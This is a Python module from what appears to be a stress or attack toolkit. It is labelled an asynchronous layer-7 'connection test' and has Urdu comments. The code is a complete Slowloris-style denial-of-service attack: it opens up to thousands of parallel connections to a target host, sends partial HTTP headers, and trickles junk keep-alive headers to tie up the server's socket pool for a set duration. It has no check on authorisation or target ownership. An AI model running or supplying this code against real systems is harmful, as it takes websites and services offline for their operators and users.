# modules/layer7_async.py — Advanced L7 Asynchronous Simulator
import asyncio
import random
import sys
from utils.colors import Colors
from utils.logger import log_attack

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"
]

async def maintain_partial_connection(host, port, session_id):
    """ایک سنگل کنکشن کو اوپن رکھ کر سرور کے ساکٹ پول کو ٹیسٹ کرنا"""
    try:
        # سرور کے ساتھ کسٹم ہینڈ شیک بنانا
        reader, writer = await asyncio.open_connection(host, port)
        
        # ابتدائی ادھورا ہیڈر بھیجنا
        start_request = f"GET /{random.randint(1, 9999)} HTTP/1.1\r\n"
        start_request += f"Host: {host}\r\n"
        start_request += f"User-Agent: {random.choice(user_agents)}\r\n"
        writer.write(start_request.encode())
        await writer.drain()

        # کنکشن کو برقرار رکھنے کے لیے وقفے وقفے سے فالتو ہیڈرز بھیجنا
        while True:
            await asyncio.sleep(random.randint(10, 20))
            keep_alive_header = f"X-C9-Faizan-KeepAlive: {random.randint(1, 5000)}\r\n"
            writer.write(keep_alive_header.encode())
            await writer.drain()
            
    except (asyncio.CancelledError, Exception):
        # کنکشن ڈراپ ہونے پر خاموشی سے ہینڈل کرنا
        pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except:
            pass

async def start_async_l7_test(host, port, duration, connection_limit):
    log_attack("Async_L7_Slow_Test", host, port, duration)
    print(Colors.info(f"Initiating High-Density Async Connection Test on {host}:{port}"))
    print(Colors.warn(f"Simulating {connection_limit} parallel partial connections via Asyncio Event Loop..."))

    tasks = []
    
    # ایونٹ لوپ میں بیک وقت ہزاروں ٹاسکس شیڈول کرنا
    for i in range(connection_limit):
        task = asyncio.create_task(maintain_partial_connection(host, port, i))
        tasks.append(task)
        # سرور پر ایک دم لوڈ ڈالنے کے بجائے آہستہ آہستہ کنکشنز بڑھانا
        if i % 100 == 0:
            await asyncio.sleep(0.1)
            print(f"\r{Colors.success(f'Active Async Sockets Registered: {i}')}", end="")

    print(f"\n{Colors.success('All async connections are now holding inside the pool.')}")
    
    # ٹیسٹ کے مقررہ وقت تک انتظار کرنا
    await asyncio.sleep(duration)
    
    # تمام ٹاسکس کو محفوظ طریقے سے بند کرنا
    print(Colors.info("\nTerminating simulator session..."))
    for task in tasks:
        task.cancel()
        
    await asyncio.gather(*tasks, return_exceptions=True)
    print(Colors.success("Test session safely wrapped up."))
